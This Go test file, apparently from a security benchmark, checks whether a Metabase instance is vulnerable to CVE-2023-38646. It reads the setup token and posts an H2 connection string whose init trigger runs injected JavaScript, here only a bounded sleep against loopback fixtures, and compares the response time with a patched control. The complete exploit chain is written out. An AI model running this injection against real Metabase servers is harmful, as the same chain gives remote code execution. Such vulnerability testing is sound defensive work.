package realbench

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"testing"
	"time"
)

// TestMetabaseRCEPair is an opt-in, black-box positive/control oracle for
// CVE-2023-38646. It executes only a bounded Java sleep inside the disposable
// Metabase connection-validation context: no shell, reverse connection, file
// write, persistence, or third-party system is involved.
func TestMetabaseRCEPair(t *testing.T) {
	vulnerableURL := strings.TrimSpace(os.Getenv("XALGORIX_METABASE_VULN_URL"))
	fixedURL := strings.TrimSpace(os.Getenv("XALGORIX_METABASE_FIXED_URL"))
	if vulnerableURL == "" || fixedURL == "" {
		t.Skip("set XALGORIX_METABASE_VULN_URL and XALGORIX_METABASE_FIXED_URL to the loopback fixture URLs")
	}
	for _, raw := range []string{vulnerableURL, fixedURL} {
		if err := ValidateLoopbackURL(raw); err != nil {
			t.Fatalf("unsafe fixture URL %q: %v", raw, err)
		}
	}

	const sleep = 4 * time.Second
	vulnerableElapsed := metabaseTimingOracle(t, vulnerableURL, sleep)
	fixedElapsed := metabaseTimingOracle(t, fixedURL, sleep)

	if vulnerableElapsed < 3*time.Second {
		t.Fatalf("vulnerable Metabase returned in %s; expected injected Java sleep to execute", vulnerableElapsed)
	}
	if fixedElapsed >= 3*time.Second {
		t.Fatalf("fixed Metabase took %s; control unexpectedly exhibited the injected sleep", fixedElapsed)
	}
}

func metabaseTimingOracle(t *testing.T, baseURL string, sleep time.Duration) time.Duration {
	t.Helper()
	client := &http.Client{Timeout: 15 * time.Second}
	propertiesURL, err := url.JoinPath(baseURL, "/api/session/properties")
	if err != nil {
		t.Fatal(err)
	}
	response, err := client.Get(propertiesURL)
	if err != nil {
		t.Fatalf("GET Metabase properties: %v", err)
	}
	defer response.Body.Close()
	if response.StatusCode != http.StatusOK {
		t.Fatalf("GET Metabase properties returned HTTP %d", response.StatusCode)
	}
	var properties map[string]any
	if err := json.NewDecoder(io.LimitReader(response.Body, 4<<20)).Decode(&properties); err != nil {
		t.Fatalf("decode Metabase properties: %v", err)
	}
	token, _ := properties["setup-token"].(string)
	if token == "" {
		t.Fatal("Metabase properties did not contain a setup token")
	}

	trigger := fmt.Sprintf("xalgorix_%d", time.Now().UnixNano())
	init := fmt.Sprintf("CREATE TRIGGER %s BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Thread.sleep(%d)\n$$", trigger, sleep.Milliseconds())
	payload := map[string]any{
		"token": token,
		"details": map[string]any{
			"is_on_demand":     false,
			"is_full_sync":     false,
			"is_sample":        false,
			"cache_ttl":        nil,
			"refingerprint":    false,
			"auto_run_queries": true,
			"schedules":        map[string]any{},
			"details": map[string]any{
				"db":               "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;",
				"advanced-options": false,
				"ssl":              true,
				"init":             init,
			},
			"name":   "xalgorix-safe-timing-oracle",
			"engine": "h2",
		},
	}
	body, err := json.Marshal(payload)
	if err != nil {
		t.Fatal(err)
	}
	validateURL, err := url.JoinPath(baseURL, "/api/setup/validate")
	if err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodPost, validateURL, bytes.NewReader(body))
	if err != nil {
		t.Fatal(err)
	}
	request.Header.Set("Content-Type", "application/json")

	started := time.Now()
	response, err = client.Do(request)
	elapsed := time.Since(started)
	if err != nil {
		t.Fatalf("POST Metabase setup validation: %v", err)
	}
	_, _ = io.Copy(io.Discard, io.LimitReader(response.Body, 1<<20))
	response.Body.Close()
	return elapsed
}
